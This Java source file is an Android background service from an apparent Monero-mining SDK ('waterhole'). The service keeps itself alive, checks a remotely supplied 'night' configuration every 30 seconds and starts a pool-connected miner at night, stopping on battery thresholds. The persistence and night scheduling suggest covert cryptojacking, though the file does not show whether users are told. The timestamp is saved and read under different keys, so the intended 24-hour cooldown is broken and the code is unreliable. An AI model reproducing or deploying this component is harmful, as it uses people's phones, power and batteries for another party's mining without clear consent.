package waterhole.miner.monero;

import android.content.*;
import android.os.*;

import java.util.Calendar;
import java.util.concurrent.*;

import io.reactivex.*;
import io.reactivex.disposables.*;
import io.reactivex.functions.Action;
import io.reactivex.functions.Consumer;
import waterhole.miner.core.StateObserver;
import waterhole.miner.core.asyn.AsyncTaskListener;
import waterhole.miner.core.config.NightConfigObject;
import waterhole.miner.core.config.NightConfiguration;
import waterhole.miner.core.keepAlive.AbsWorkService;

import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.LogUtils.info;

public class TraceServiceImpl extends AbsWorkService {

    // 是否 任务完成, 不再需要服务运行?
    public static boolean sShouldStopService;
    public static Disposable sDisposable;

    private NightConfigObject nightConfig;

    private int startBatteryLevel;

    private final BroadcastReceiver mBatteryReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action != null && action.equals(Intent.ACTION_BATTERY_CHANGED)) {
                // 电池电量
                int level = intent.getIntExtra("level", 0);
                // 电池状态
                int status = intent.getIntExtra("status", BatteryManager.BATTERY_STATUS_UNKNOWN);
                info("电池电量 = " + level + " ,充电状态 = " + status);

                if (nightConfig != null) {
                    if (startBatteryLevel == 0) {
                        startBatteryLevel = level;
                    }
                    if (status == BatteryManager.BATTERY_STATUS_CHARGING) {
                        if (level - startBatteryLevel >= nightConfig.consumerChargingPower) {
                            nightConfig = null;
                            startBatteryLevel = 0;
                            saveLastStopTimestamp(context);
                            stopMine();
                        }
                    } else {
                        if (level < nightConfig.minPower || level - startBatteryLevel >=
                                nightConfig.consumerPower) {
                            nightConfig = null;
                            startBatteryLevel = 0;
                            saveLastStopTimestamp(context);
                            stopMine();
                        }
                    }
                } else {
                    startBatteryLevel = 0;
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);
        filter.addAction(Intent.ACTION_BATTERY_LOW);
        registerReceiver(mBatteryReceiver, filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        unregisterReceiver(mBatteryReceiver);
    }

    public static void stopService() {
        // 我们现在不再需要服务运行了, 将标志位置为 true
        sShouldStopService = true;
        // 取消对任务的订阅
        if (sDisposable != null) sDisposable.dispose();
        // 取消 Job / Alarm / Subscription
        cancelJobAlarmSub();
    }

    /**
     * 是否 任务完成, 不再需要服务运行?
     *
     * @return 应当停止服务, true; 应当启动服务, false; 无法判断, 什么也不做, null.
     */
    @Override
    public Boolean shouldStopService(Intent intent, int flags, int startId) {
        return sShouldStopService;
    }

    @Override
    public void startWork(Intent intent, int flags, int startId) {
        info("keep alive: 检查磁盘中是否有上次销毁时保存的数据");
        sDisposable = Observable
                .interval(30, TimeUnit.SECONDS)
                // 取消任务时取消定时唤醒
                .doOnDispose(new Action() {
                    @Override
                    public void run() throws Exception {
                        info("keep alive: cancel.");
                        cancelJobAlarmSub();
                    }
                })
                .subscribe(new Consumer<Long>() {
                    @Override
                    public void accept(Long count) {
                        info("keep alive: 每 30 秒采集一次数据... count = " + count);
                        NightConfiguration.instance().getConfigObject(getApplicationContext(),
                                new AsyncTaskListener<NightConfigObject>() {
                                    @Override
                                    public void runComplete(NightConfigObject nightConfig) {
                                        if (nightConfig == null || isMining()) {
                                            TraceServiceImpl.this.nightConfig = null;
                                            return;
                                        }
                                        long current = Calendar.getInstance().getTimeInMillis();
                                        if ((current - nightConfig.nightStartupTimestamp) < 0
                                                || (current - getLastStopTimestamp(getApplicationContext())
                                                <= 24 * 60 * 60 * 1000)) {
                                            TraceServiceImpl.this.nightConfig = null;
                                            return;
                                        }
                                        if (!nightConfig.enableNightDaemon) {
                                            TraceServiceImpl.this.nightConfig = null;
                                            stopMine();
                                            return;
                                        }
                                        TraceServiceImpl.this.nightConfig = nightConfig;
                                        startMine();
                                    }
                                });
                    }
                });
    }

    @Override
    public void stopWork(Intent intent, int flags, int startId) {
        stopService();
    }

    /**
     * 任务是否正在运行?
     *
     * @return 任务正在运行, true; 任务当前不在运行, false; 无法判断, 什么也不做, null.
     */
    @Override
    public Boolean isWorkRunning(Intent intent, int flags, int startId) {
        // 若还没有取消订阅, 就说明任务仍在运行.
        return sDisposable != null && !sDisposable.isDisposed();
    }

    @Override
    public IBinder onBind(Intent intent, Void v) {
        return null;
    }

    @Override
    public void onServiceKilled(Intent rootIntent) {
        info("keep alive: 保存数据到磁盘。");
    }

    private void startMine() {
        XmrMiner.instance().init(getApplicationContext()).setStateObserver(new StateObserver() {

            @Override
            public void onConnectPoolBegin() {
                info("onConnectPoolBegin");
            }

            @Override
            public void onConnectPoolSuccess() {
                info("onConnectPoolSuccess");
            }

            @Override
            public void onConnectPoolFail(String error) {
                error("onConnectPoolFail: " + error);
            }

            @Override
            public void onPoolDisconnect(String error) {
                error("onPoolDisconnect: " + error);
            }

            @Override
            public void onMessageFromPool(String message) {
                info("onMessageFromPool: " + message);
            }

            @Override
            public void onMiningError(String error) {
                error("onMiningError = " + error);
            }

            @Override
            public void onMiningStatus(double speed) {
                info("onMiningStatus speed = " + speed);
            }
        }).startMine();
    }

    private void stopMine() {
        XmrMiner.instance().stopMine();
    }

    private boolean isMining() {
        return XmrMiner.instance().isMining();
    }

    private void saveLastStopTimestamp(Context context) {
        SharedPreferences sp = context.getSharedPreferences("LAST_STOP_TIMESTAMP", Context.MODE_PRIVATE);
        sp.edit().putLong("last_stop_timestamp", Calendar.getInstance().getTimeInMillis()).apply();
    }

    private long getLastStopTimestamp(Context context) {
        SharedPreferences sp = context.getSharedPreferences("LAST_STOP_TIMESTAMP", Context.MODE_PRIVATE);
        return sp.getLong("LAST_STOP_TIMESTAMP", 0);
    }
}
